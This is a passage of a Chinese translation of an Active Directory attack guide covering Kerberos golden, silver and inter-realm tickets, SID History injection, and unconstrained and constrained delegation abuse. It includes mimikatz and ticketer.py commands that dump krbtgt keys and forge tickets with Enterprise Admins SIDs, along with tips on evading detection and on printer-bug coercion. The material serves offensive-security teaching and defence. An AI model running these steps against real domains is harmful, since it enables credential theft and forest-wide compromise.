krbtgt:aes128-cts-hmac-sha1-96:a268f61e103134bb7e975a146ed1f506
krbtgt:des-cbc-md5:0e6d79d66b4951cd
[*] Cleaning up...
```

同样的，拿到服务用户Kerberos密钥创建自定义ST，即[Silver Ticket ](https://en.hackndo.com/kerberos-silver-golden-tickets/#silver-ticket)。服务用户的密钥可以通过查看用户登录的域计算机的 [lsass process](https://zer1t0.gitlab.io/posts/attacking_ad/#lsass-credentials)来获得，比如 [Kerberoast ](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberoast)， 或[dumping the Active Directory database ](https://zer1t0.gitlab.io/posts/attacking_ad/#domain-database-dumping)。

我们可以通过修改PAC用户组向票证用户（即便不存在此用户）授予高权限，但必须使用krbtgt密钥对票据PAC进行签名

 [mimikatz kerberos::golden](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver) command or the [impacket ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) 可以创建黄金/白银票据 ，最好用AES256 密钥避免[being detected by solutions like ATA](https://www.blackhat.com/docs/us-17/thursday/us-17-Mittal-Evading-MicrosoftATA-for-ActiveDirectory-Domination.pdf)

```text
###Create golden ticket with ticketer.py
$ ticketer.py -domain-sid S-1-5-21-1372086773-2238746523-2939299801 -domain contoso.local Administrator -aes 5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for contoso.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache
```

黄金票据20min必须使用（ [must be used in 20 minutes](https://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html),），不然PAC信息会被KDC检查，验证是否正确。

白银票据只能让你访问有其密码的用户的服务的权限，例如一个没有权限的域用户用管理员密码生成对应服务白银票据来冒充管理员

简单说就是白银票据能访问一个用户的服务，黄金票据访问域中任何服务，且不止。

## **Kerberos Across domains**

黄金票据还能用来 [compromise the entire forest ](https://adsecurity.org/?p=1640)**，** 回顾一下Kerberos如何跨受信任域工作。域用户可以访问信任域中的服务（使用incoming or bidirectionals [trusts](https://zer1t0.gitlab.io/posts/attacking_ad/#trusts)）。访问外部域资源的过程还需要身份验证，这可以由Kerberos提供

但KDC（DC）只能为其域中的服务发出STs，Kerberos要跨域工作，得向外部域DC服务器请求一个ST，因此需要该服务器的TGT，当我们为另一个域中的服务请求ST时，外部KDC的TGT（称为域间（ inter-realm）TGT）由我们的KDC发出，步骤如下：

```
###Kerberos across domains
  KDC foo.com                                                    KDC bar.com
    .---.                                                          .---.
   /   /|                       .---4) TGS-REQ (TGT bar)------->  /   /|
  .---. |                       |    + SPN: HTTP\srvbar          .---. |
  |   | '                       |    + TGT client > bar.com      |   | '
  |   |/                        |                                |   |/ 
  '---'                         |   .--5) TGS-REP--------------< '---'
  v  ^                          |   | + ST client > HTTP/srvbar
  |  |                          |   |
  |  |                          ^   v                                   .---.
  |  '-2) TGS-REQ (TGT foo)--<  _____                                  /   /|
  |   + SPN: HTTP\srvbar       |     | <----------1) SPNEGO---------> .---. |
  |   + TGT client > foo.com   |_____|                                |   | '
  |                            /:::::/ >----6) AP-REQ---------------> |   |/
  '--3) TGS-REP--------------> client     + ST client > HTTP/srvbar   '---'  
    + TGT client > bar.com    (foo.com)                               srvbar
                                                                    (bar.com)
```

1.客户端/用户，来自foo.com域，使用SPNEGO与所需服务协商Kerberos身份验证，在本例中是bar.com域的HTTP\srvbar（服务器srvbar中的web服务器）

2.客户端通过发送TGS-REQ消息，用其foo.com的TGT请求ST，将HTTP\srvbar发送到其KDC

3.KDC确定此服务位于信任域bar.com中，因此，foo.com KDC通过使用 [inter-realm trust key](https://zer1t0.gitlab.io/posts/attacking_ad/#trust-key)（域信任双方共享的密钥）作为加密（和PAC签名）密钥[creates a TGT for bar.com](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/bac4dc69-352d-416c-a9f4-730b81ababb3)，然后，KDC在TGS-REP消息中返回bar.com TGT。bar.com TGT中包含的PAC是foo.com TGT PAC的副本

4.客户端通过发送TGS-REQ消息，使用bar.com TGT向bar.com KDC请求HTTP\srvbar ST

5.bar.com KDC通过使用域间信任密钥对票据进行解密来检查票据。然后为客户端创建一个ST for HTTP\srvbar。创建新ST时，TGT中的PAC将被复制并在必要时进行 [filtered](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280) 。通常，不属于受信任域林的额外SID会 [removed](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/#golden-tickets-and-sid-filtering)

6.最后，客户端使用ST向HTTP\srvbar服务验证

奇怪的是，通常情况下，域间TGT是使用RC4算法而不是AES256加密的

#### **SID History attack**

这个过程的有趣之处在于，在域间交互的票据之间复制PAC的方式；能让攻击者伪造黄金票据来[compromise the entire forest](https://adsecurity.org/?p=1640)

 [PAC](https://zer1t0.gitlab.io/posts/attacking_ad/#pac)有一个字段包含额外的SID，用于识别特殊实体，此字段通常用于包括存储在SIDHistory属性中的那些SID

SID历史记录用于迁移目的。当用户从一个域迁移到另一个域时，将重置用户的权限，创建新SID，将用户添加到新组中，等等。但是，用户在旧域中所属组中的SID存储在SID History属性中

然后，当用户想要访问旧域中的资源时，他们的历史SID将添加到PAC extra SID字段中。通过这种方式，旧域可以查看这些SID，并授予用户旧权限，允许其访问旧域资源

但是，根据[SID filtering](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/)策略，可以省略额外的SID（而不是复制到ST PAC中）。通常，**域允许来自森林中其他域的SID（默认情况下），**但根据[ForestSpecific](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)规则**丢弃来自外部林的额外SID**，因为森林是Active Directory的安全边界

此外，**同一森林的域能被隔离**，从而通过应用 [QuarantinedWithinForest](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)策略删除额外的SID

相反，[SID history can be enabled ](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/#sid-filtering-relaxation)在不同林的域之间的信任中，但有一些限制。允许具有目标（信任）森林的SID且 [RID](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_df3d0b61-56cd-4dac-9402-982f1fedc41c) 高于1000的组。因此，将过滤RID低于1000的管理组（如“[Domain Admins](https://adsecurity.org/?p=3658)”（RID=512）），但属于这些管理组的RID较高的组（也将成为管理组），例如Exchange管理组不会。

然后，如果编辑了SID历史记录，则可以注入其他域的管理权限。例如，如果在用户SID历史记录中注入 [Enterprise Admins](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756898(v=ws.10)) SID，则该用户可以在整个林中拥有管理权限。

 SID历史记录 [can be edited directly](https://adsecurity.org/?p=1772)，用[mimikatz misc::addsid](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz#sid)能直接在AD数据库

但像之前说的，SID历史记录会被复制到TGT的PAC中，因此如果我们能伪造一个黄金票据，就能将我们想要的历史SID直接注入PAC extra SIDs属性中。然后，当我们使用这个“Golder”票证时，它的PAC被复制到域间TGT中，之后，当使用此域间TGT为外部域中的服务获取ST时，如果此域位于同一林中，则可以将特权SID复制到ST PAC中，从而授予我们最初在Golder票证中注入的特权

一个有趣的SID是“[Enterprise Admins](https://adsecurity.org/?p=3658)”，该组仅存在于林的根域中，并且默认情况下作为林中所有域的所有“域管理员”组的成员添加。

实际上，如果渗透域的根林并创建一个包含“Enterprise Admins”组（RID为519，默认情况下包含在impacket和mimikatz中）的黄金票据，则不需要创建具有额外SID的Golder票据，因为您已经拥有控制所有林的权限，即使是隔离的域（因为没有额外的SID进行过滤）。只有在您渗透了非根域并且希望渗透林的另一个域（过滤额外SID的隔离域除外）时，才需要向额外SID添加“企业管理员”。

```cmd
###Pass-The-Ticket with Enterprise Admins in extra SIDs
PS C:\> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::krbtgt

Current krbtgt: 5 credentials
         * rc4_hmac_nt       : 1bf960a6af7703f75b1a2b04787c85fb
         * rc4_hmac_old      : 1bf960a6af7703f75b1a2b04787c85fb
         * rc4_md4           : 1bf960a6af7703f75b1a2b04787c85fb
         * aes256_hmac       : 8603210037f738c50120dbe0f2259466fd4fdd1d58ec0cf9ace34eb990c705a3
         * aes128_hmac       : 204be93d3c18326bf0e6675eb0a32202

mimikatz # kerberos::golden /admin:Administrator /domain:it.poke.mon /sid:S-1-5-21-1913835218-2813970975-3434927454 /sids:S-1-5-21-4285720809-372211516-2297741651-519 /aes256:8603210037f738c50120dbe0f2259466fd4fdd1d58ec0cf9ace34eb990c705a3 /ptt /groups:512,520,572
User      : Administrator
Domain    : it.poke.mon (IT)
SID       : S-1-5-21-1913835218-2813970975-3434927454
User Id   : 500
Groups Id : *512 520 572
Extra SIDs: S-1-5-21-4285720809-372211516-2297741651-519 ;
ServiceKey: 8603210037f738c50120dbe0f2259466fd4fdd1d58ec0cf9ace34eb990c705a3 - aes256_hmac
Lifetime  : 5/13/2021 9:36:28 AM ; 5/11/2031 9:36:28 AM ; 5/11/2031 9:36:28 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ it.poke.mon' successfully submitted for current session
```

但是，要实施[dcsync attack in other domain](http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/)，可能使用“企业域控制器”（S-1-5-9）和“域控制器”（S-1-5-21-domain-516）组SID更隐蔽一些，因为DC通常执行dcsync中使用的同步。

创建Golder票据 ，用  [mimikatz kerberos::golden](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver) command or the [impacket ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) script ，和黄金票据流程相似但加了额外的SIDs，最好用AES256 密钥

#### **Inter-realm TGT**

将Kerberos用于域间操作引入了一种新的TGT，即域间TGT。这个TGT与普通TGT完全相同，只是它使用**域间信任密钥加密**，这是一个允许信任双方在它们之间通信的密钥。密钥存储为 key of an [user account that represents the trust](https://zer1t0.gitlab.io/posts/attacking_ad/#trust-accounts).

[dump the domain database ](https://zer1t0.gitlab.io/posts/attacking_ad/#domain-database-dumping)来拿域间域信任密钥，有一种情况下，您可以[through Kerberoast](https://blog.xpnsec.com/inter-realm-key-roasting/).获得信任密钥

创建域信任时，可能是用户设置的弱密码。然后，您可以获得一个用域信任密钥加密的域间TGT，然后尝试破解以获取信任密码（用于生成所有Kerberos信任密钥）。但请记住，信任密码和机器密码通常每30天更改一次

最后，获得信任密钥后， [create a inter-realm ticket](https://adsecurity.org/?p=1588)，可以使用 [mimikatz kerberos::golden](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver) command or the [impacket ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)脚本。然后你可以把它当作任何票据用。互信票据使用RC4密钥加密，即信任帐户的NT哈希。

## **Kerberos Delegation**

Kerberos允许用户在整个域甚至其他域中验证和访问服务。但是，有时被访问的服务需要[ impersonate the user](https://en.hackndo.com/constrained-unconstrained-delegation/#delegation-principle)，以便与第三方服务对话

用户登录的web服务器（使用Kerberos）需要代表用户在数据库中执行某些活动。但是，当用户在web服务器进行身份验证时，服务器只接收用户ST，因此要模拟用户，还需要为数据库服务提供用户ST

为了处理这种情况，可以使用Kerberos委派。此功能提供了允许服务代表客户端为第三方服务获取ST的机制

AD中Kerberos 委派有两种方式：

**Unconstrained Delegation**

意味着将ST中的用户TGT发送到服务，允许它通过使用客户端TGT完全模拟KDC中的客户端

**Constrained Delegation**

提供机制，即 [Service for User](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94) (S4U)扩展，允许服务代表用户请求ST而无需使用客户端TGT，并且仅针对特定允许的服务

接下来讨论一下[how Kerberos delegation works](https://www.tarlogic.com/en/blog/kerberos-iii-how-does-delegation-work/)。但首先得了解一下阻止delegation 发挥作用的anti-delegation措施。

### **Kerberos Anti Delegation Measures**

有两种机制可以避免委派特定的用户帐户（在Kerberos中模拟）

- 在用户帐户的 [UserAccountControl](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)属性中设置NOT_Delegate标志。
- 把用户加入到 [Protected      Users ](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11))组中

设置一个就不可能会委派，因此知道什么账户被保护就很重要，用以下LDAP查询可以确定这些用户：

```ldap
###LDAP filter to retrieve accounts protected against delegation
(|
  (memberof:1.2.840.113556.1.4.1941:=CN=Protected Users,CN=Users,DC=<domain>,DC=<dom>)
  (userAccountControl:1.2.840.113556.1.4.803:=1048576)
)
```

工具  [Powerview](https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1), the [Powershell ActiveDirectory module](https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps) or [ldapsearch](https://linux.die.net/man/1/ldapsearch)

###  **Kerberos Unconstrained Delegation**

[Kerberos Unconstrained Delegation ](https://adsecurity.org/?p=1667)服务可以模拟客户端用户，因为这会向服务发送自己的TGT，服务可以使用用户TGT（无任何约束）代表客户端请求其他服务的新STs

KDC在ST中为其所有者服务用户设置了 [UserAccountControl](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) TRUSTED_FOR_DELEGATION 标志的任何服务设置 [OK-AS-DELEGATE ](https://tools.ietf.org/html/rfc4120#section-2.8)标志。通过检查 [OK-AS-DELEGATE](https://tools.ietf.org/html/rfc4120#section-2.8)和 [FORWARDABLE](https://tools.ietf.org/html/rfc4120#section-2.6) 标志，客户机知道是否应该请求将TGT发送到目标服务以允许无约束的委托。

如果客户端是 [Protected Users](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11)) group 的成员或 [UserAccountControl](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) NOT_DELEGATED 设置了，那[FORWARDABLE](https://tools.ietf.org/html/rfc4120#section-2.6) 标志会在ST设置为未设置

而且设置用户账户的TRUSTED_FOR_DELEGATION 标志得有 [SeEnableDelegationPrivilege](https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/)

栗子如下：

```
###Unconstrained delegation process
                                    KDC (DC)
 .-----------1) TGS-REQ-------------> .---. <--------6) TGS-REQ-------------.
 |         + SPN: HTTP/websrv        /   /|     + SPN: MSSQLSvc/dbsrv       |
 |         + TGT client             .---. |     + TGT client - FORWARDED    |
 |                                  |   | '                                 |
 |  .--------2) TGS-REP-----------< |   |/ >--------7) TGS-REP-----------.  |
 |  |  + ST client > HTTP/websrv    '---'   + ST client > MSSQLSvc/dbsrv |  |
 |  |    - OK-AS-DELEGATE           ^   v                                |  |
 |  |    - FORWARDABLE              |   |                                |  |
 ^  v                               |   |                                |  |
  _____                             |   |                                |  |
 |     | >-----3) TGS-REP-----------'   |                                |  |
 |_____|  + SPN: krbtgt/domain.local    |                                |  |
 /:::::/  + TGT client                  |                                |  |
 ------                                 |                                |  |
 client  <-----4) TGS-REP---------------'                                |  |
   v        + TGT client - FORWARDED                                     v  ^
   |                                                                    .---.
   |                                                                   /   /|
   |                                                                  .---. |
   '----------------------------5) AP-REQ---------------------------> |   | '
                          + ST client > HTTP\websrv                   |   |/
                          + TGT client - FORWARDED                    '---'
                                                                      websrv
                                                                       v
                                  .---.                                |
                                 /   /|                                |
                                .---. | <--------8) AP-REQ-------------'
                                |   | '   + ST client > MSSQLSvc\dbsrv
                                |   |/
                                '---'
                                dbsrv
```

1.客户端使用其TGT为服务HTTP\websrv（websrv服务器中的web服务）请求ST。HTTP\websrv服务属于用户websrv$（请记住[[#computer-accounts] [computer-accounts]]的用户名以=$=]结尾）

2.KDC检查是否为websrv$设置了 [TRUSTED_FOR_DELEGATION](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)标志。因此，KDC向客户端返回一个具有[OK-AS-DELEGATE](https://tools.ietf.org/html/rfc4120#section-2.8)标志（[FORWARDABLE](https://tools.ietf.org/html/rfc4120#section-2.6)）的HTTP\websrv ST

3.客户端检查 [OK-AS-DELEGATE](https://tools.ietf.org/html/rfc4120#section-2.8)标志，该标志指示服务使用委托，因此它决定向KDC请求转发的TGT以发送给服务。

4.KDC返回设置了FORWARDED 标志的TGT。

5.客户端将包含FORWARDED TGT的ST发送到websrv，以访问HTTP\websrv服务。

6.HTTP\websrv需要模拟客户端来访问位于dbsrv中的数据库服务。因此，web服务通过使用接收到的客户端TGT，代表客户端请求MSSQLSvc\dbsrv的ST。

7.然后，KDC返回一个ST，供客户端访问MSSQLSvc\dbsrv服务。

8.最后，HTTP\websrv服务通过模拟客户端使用ST访问MSSQLSvc\dbsrv。

可能需要记住的最重要的事实是，发送到HTTP\websrv的任何ST都将包含来自客户端的TGT。因此，如果有人破坏websrv服务器，它将能够获得TGTs ，并使用它们通过Pass-the-Ticket攻击假冒任何客户端。

从Windows计算机（包括委派的TGT）检索票据，可以用 [mimikatz sekurlsa::tickets](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#tickets) command or [Rubeus dump ](https://github.com/GhostPack/Rubeus#dump)，或 [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sqldumper or others ](https://lolbas-project.github.io/#/dump)来dump lsass并mimikatz or [pypykatz ](https://github.com/skelsec/pypykatz)离线提取票据 

要记住：对于设置了[UserAccountControl ](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)TRUSTED_FOR_DELEGATION标志的帐户的服务，TGT包含在所有STs中，因此，在上一个示例中，如果websrv$计算机帐户是HTTP\websrv服务的所有者，则为websrv$的任何其他服务请求的任何ST，例如CIFS\websrv（访问SMB共享），也将包含客户端TGT

为了识别具有无约束委派的帐户，可以使用以下LDAP筛选器：

```ldap
(UserAccountControl:1.2.840.113556.1.4.803:=524288)
```

找Unconstrained Delegation accounts，可以用 [Powerview](https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1) , [impacket findDelegation.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py) script, the [Powershell ActiveDirectory module](https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps) or [ldapsearch](https://linux.die.net/man/1/ldapsearch). 

因此如果渗透了一个账户有无约束委派的服务器，就能拿到所有连接到此客户端的TGTs，可以钓鱼让用户连接你的服务器，如伪造能连接到渗透到的机器的文件来拿Kerberos TGTs。和拿[NTLM hashes to crack](https://zer1t0.gitlab.io/posts/attacking_ad/#ntlm-hashes-cracking)的方法有些相似

可以通过强制计算机帐户连接到带有打印机bug的服务器来获取计算机帐户的TGT。打印机bug使用RPRN RPC接口的RPC调用，该接口允许任何“已验证用户”向目标计算机指示要通过SMB连接的服务器

[SpoolSample](https://github.com/leechristensen/SpoolSample) tool or the [printerbug.py ](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)能用来触发打印机bug，必须将主机名作为参数传递给目标计算机才能使用Kerberos，如果提供的是IP，则会用NTLM身份验证，也就不会执行委派。扫描启用了spool服务（默认开启）的计算机 用 [SpoolerScan.ps1](https://github.com/vletoux/SpoolerScanner)

监视TGT的apparition （幻影？）可用[Rubeus monitor](https://github.com/GhostPack/Rubeus#monitor)



也可以 重新收集[ TGTs without touching the compromised servers](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/).

为此得修改已渗透无约束委派帐户的SPN，但需要Validated-SPN 权限才能修改，且默认不会授予自己账户；但对计算机账户来说，可以在默认情况下添加与其主机名匹配的SPN，并且其中包括添加到msDS-AdditionalDnsHostName的主机名，该主机名可以由帐户本身修改

要设置一个主机名指向我们的机器，可以用 [Powermad](https://github.com/Kevin-Robertson/Powermad) or [dnstool.py ](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)创建 [custom ADIDNS record ](https://blog.netspi.com/exploiting-adidns/)，然后用printer bug or phising techniques 让用户在我们的服务器上认证身份。最后要重新收集TGTs 可以用 [krbrelayx ](https://github.com/dirkjanm/krbrelayx)

一个渗透域的有意思的点是， execute the [printer bug against a DC](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)，让它连接到被渗透服务器，这样能拿到DC的TGT然后发起[DCSync attack](https://adsecurity.org/?p=1729)

#### **Kerberos Unconstrained Delegation across forests**

这种技术也能跨启用了TGT委托的双向林信任使用（ [across bidirectional forest trusts](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)），来渗透另一个林。通常，TGT委派在默认情况下是启用的，但 [Microsoft issued a patch](https://support.microsoft.com/en-us/help/4490425/updates-to-tgt-delegation-across-incoming-trusts-in-windows-server)，使**TGT委派在默认情况下禁用**

攻击者从barsrv向foosrv发送RPC调用，以indicate to this last one（foosrv？）连接到udbarsrv，udbarsrv具有无约束的委派。完成后，可以在udbarsrv中获得foosrv$（foosrv的域用户）的TGT：

```
###Kerberos messages in printer bug across domains (delegation enabled)
   .--1) TGS-REQ---------------->  .---. <-------8) TGS-REQ----------------.
   |  + SPN: cifs/foosrv          /   /|   + SPN: cifs/udbarsrv            | 
   |                             .---. |   + TGT foosrv$ > bar.com         |
   |                             |   | '                                   |
   | .------2) TGS-REP---------< |   |/  >-------9) TGS-REP--------------. |
   | | + TGT barsrv$ > foo.com   '---'     + ST foosrv$ > cifs/udbarsrv  | |
   | |                           KDC         - OK-AS-DELEGATE            | |
   | |                          bar.com                                  | |
   ^ v                                                                   | |
   .---.                                                                 | |
  /   /|  RpcRemoteFindFirstPrinterChangeNotification -> udbarsrv        | |
 .---. | ---------5) AP-REQ -------------------------------------------. | |
 |   | '      + ST barsrv$ > cifs/foosrv                               | | |
 |   |/                                                                | | |
 '---'                                                                 | | |
 barsrv      .---.                                                     | | |
 ^ v        /   /| <-------12) AP-REQ--------------------.             | | |
 | |       .---. |     + ST foosrv$ > cifs/udbarsrv      |             | | |
 | |       |   | '     + TGT foosrv$                     |             | | |
 | |       |   |/        - FORWARDED                     |             v v ^
 | |       '---'                                         '-----------< .---.
 | |      udbarsrv                 .--6) TGS-REQ--------------------< /   /|
 | |                               |  + SPN: cifs/udbarsrv           .---. |
 | |                               |                                 |   | '
 | |                               |  .----7) TGS-REP--------------> |   |/ 
 | |                               |  |  + TGT foosrv$ > bar.com     '---'  
 | |                               v  ^    - OK-AS-DELEGATE          foosrv
 | |                               .---.                              v ^
 | '-------3) TGS-REQ-----------> /   /|                              | |
 |      + SPN: cifs/foosrv       .---. |<-----10) TGS-REQ-------------' |
 |      + TGT barsrv$ > foo.com  |   | '  + SPN: krbtgt/foo.com         |
 |                               |   |/                                 |
 '--------4) TGS-REP-----------< '---'  >-----11) TGS-REP---------------'
   + ST barsrv$ > cifs/foosrv    KDC       + TGT foosrv$ 
                                 foo.com      - FORWARDED
```

1.barsrv（属于bar.com域）向bar.com KDC发送TGS-REQ，请求为foosrv的SMB服务（cifs）提供ST（因为打印机错误使用 [RPC over SMB](https://zer1t0.gitlab.io/posts/attacking_ad/#rpc-over-smb)）

2.bar.com KDC检查请求的服务是否在信任域foo.com中，并为该域发出barsrv$的TGT。

3.然后barsrv使用其指向foo.com的TGT请求foo.com KDC提供指向cifs/foosr服务的ST

4.foo.com KDC给barsrv$返回指向 cifs/foosrv的ST

5.然后barsrv根据foosrv进行身份验证，并执行打印机错误调用 [RpcRemoteFindFirstPrinterChangeNotification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83)，指示foosrv（属于foo.com域）使用 [SMB](https://zer1t0.gitlab.io/posts/attacking_ad/#rpc-over-smb)连接到udbarsrv服务器（属于bar.com域）。

6.foosrv要求foo.com KDC为udbarsrv（cifs/udbarsrv）的SMB服务提供ST。

7.foo.com KDC检查请求的服务是否在信任域bar.com中，并为该域发出foosrv$的TGT。此TGT包括OK-AS-DELEGATE标志，该标志表示已从foo.com为bar.com启用TGT委派。

8.接下来，foosrv使用新的TGT向bar.com KDC请求cifs/udbarsrv的ST。

9.bar.com KDC 为foosrv$返回指向cifs/udbarsrv的ST 。此ST设置了OK-AS-DELEGATE标志，表示服务使用无约束委派。

10.然后，foosrv检查cifs/udbarsrv是否使用委托，而且bar.com委托是允许的，因此它向foo.com KDC请求转发的TGT。

11. foo.com KDC将用户foosrv$的TGT返回给foosrv服务器。

12.最后，foosrv连接到udbarsrv并进行身份验证，包括它自己的TGT。现在，此计算机中的攻击者可以重新获取TGT并使用它访问foosrv

在本例中，barsrv和udbarsrv是不同的服务器，表明它们可以是不同的机器，但打印机错误也可用于指示重新连接到执行RPC调用的同一台机器。此外，KDC也可以是执行或接收打印机错误调用的服务器。在本例中，使用了许多不同的机器，以便在攻击中显示不同的Kerberos消息和角色。

在这方面，重要的是要知道DC（KDC）启用了无约束的委托，因此，对域DC的渗透可能会导致对具有启用TGT委托的双向信任的其他林的渗透。

### **Kerberos Constrained Delegation**

无约束的委托可能是一件危险的事情，因为它允许完全模拟客户端。

因此，为了创建更严格的委托机制，Microsoft开发了两个Kerberos扩展，称为 [Service for User](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94) （S4U）：

- Service for User to Proxy (S4U2proxy)
- Service for User to Self (S4U2self)

通过使用这些扩展，可以将服务限制为仅对一组允许的第三方服务执行委派，并且不需要用户TGT，从而防止将其存储在服务服务器上,即受限委托

#### **S4U2proxy**

允许服务通过使用发送到服务的客户端ST（而不是客户端TGT）来代表客户端向ST请求另一个服务

与无约束委托不同，服务只能为某些白名单服务请求模拟ST。允许的服务由以下属性定义：

- 服务用户帐户的 [msDS-AllowedToDelegateTo](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-c6446e77daaa) 属性包含一个SPNs（服务）列表，它（及其服务）可以代表客户端请求ST。此**服务列表**用于经典的受约束委派。要修改msDS-AllowedToDelegateTo，需要[SeEnableDelegationPrivilege](https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/)。
- 服务用户账户列在目标服务用户账户的[msDS-AllowedToActOnBehalfOfOtherIdentity      ](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/cea4ac11-a4b2-4f2d-84cc-aebb4a4ad405)属性，这个**用户列表用于**Resource Based Constrained Delegation (RBCD)

以下命令（由Powershell的ActiveDirectory模块生成）显示了这些属性的示例：

```powershell
###Example of msDS-AllowedToDelegateTo
PS C:\Users\Administrator> get-aduser anakin -Properties msDS-AllowedToDelegateTo

DistinguishedName        : CN=Anakin,CN=Users,DC=contoso,DC=local
msDS-AllowedToDelegateTo : {HTTP/webserver, HTTP/webserver.contoso.local}
SamAccountName           : anakin
SID                      : S-1-5-21-1372086773-2238746523-2939299801-1103
UserPrincipalName        : anakin@contoso.local
```

这里，允许用户Anakin的服务对“HTTP/webserver”服务执行委托。因此，Anakin可以针对“HTTP/webserver”模拟任何用户（ [protected ones](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos-anti-delegation-measures)除外）。

```
msDS-AllowedToDelegateTo                .---.
                                       /   /|
         \o/      delegate to         .---. |
          |  -----------------------> |   | '
         / \                          |   |/ 
        Anakn                         '---'  
                                    HTTP/webserver
```

此外，由于可以更改票据的目标服务，Anakin可以代表客户端请求“HTTP/webserver”的票据，并将目标服务更改为“HTTP/webserver”所有者的任何服务，因为所有这些服务都将使用相同的Kerberos密钥加密。

例如，如果“HTTP/webserver”的用户是webserver$（webserver计算机的用户帐户），则Anakin可以代表客户端请求“HTTP/webserver”的票证，并通过将目标服务更改为“cifs/webserver”，使用此票证访问webserver的SMB服务。这样，Anakin就可以通过模拟客户端访问Web服务器。

```powershell
###Example of msDS-AllowedToActOnBehalfOfOtherIdentity
PS C:\Users\Administrator> get-aduser han -Properties PrincipalsAllowedToDelegateToAccount,msDS-AllowedToActOnBehalfOfOtherIdentity

DistinguishedName                        : CN=Han,CN=Users,DC=contoso,DC=local
Enabled                                  : True
GivenName                                : Han
msDS-AllowedToActOnBehalfOfOtherIdentity : System.DirectoryServices.ActiveDirectorySecurity
Name                                     : Han
ObjectClass                              : user
ObjectGUID                               : 356a7fb7-6cc0-4e09-a77f-b64e1677f2a8
